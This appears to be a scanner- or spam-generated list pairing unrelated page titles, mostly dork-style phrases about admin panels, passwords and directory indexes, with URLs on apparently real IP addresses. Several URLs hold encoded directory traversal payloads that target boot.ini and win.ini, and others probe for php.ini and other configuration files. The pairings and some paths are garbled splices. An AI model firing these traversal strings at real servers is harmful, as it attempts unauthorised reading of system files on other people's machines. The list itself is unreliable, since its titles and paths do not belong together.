Mail,http://210-242-148-168.hinet-ip.hinet.net/login/enc/view/php.ini
iDevAffiliate - admin - web,http://210-242-146-178.hinet-ip.hinet.net/login/phpsysinfo/php.ini
Supero Doctor III,http://61-64-230-163-adsl-tpe.dynamic.so-net.net.tw/login/cse.google.com.eg/wps/portal/utilities/editor/perform.ini
"welcome.to.squeezebox - \""System",http://210.242.146.167/comments/printer/flashFXP.ini
SFXAdmin - sfx_global,http://210.242.147.163/login/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cboot.ini
Microsoft Software upd?t? Services,http://210.242.148.156/loginadmin/..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cboot.ini
"Login to @Mail - \""Big",http://210.242.148.164/login/perl/default.asp/preferences.ini
V.Networks [Top],http://61.62.66.153/login/home.uceusa.com//servlet/suse/perform.ini
Metaframe - LOGREP - Log file reporting system,http://61.62.173.182/login/inc/install/preferences.ini
System Statistics - ASP Stats Generator *.*,http://203.105.230.133/login/axis-cgi/Pageid/php.ini
mywebftp - Password,http://210.203.16.149/loginsave/2082/..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255c..%25255cboot.ini
php,http://210.203.16.144/login/%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cboot.ini
"\""index.of.personal\"" - control",http://210.242.145.128/comments/lib/admin/php.ini
index of,http://210.202.233.129/login1/vsadmin/default.asp/..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255Cwindows/win.ini
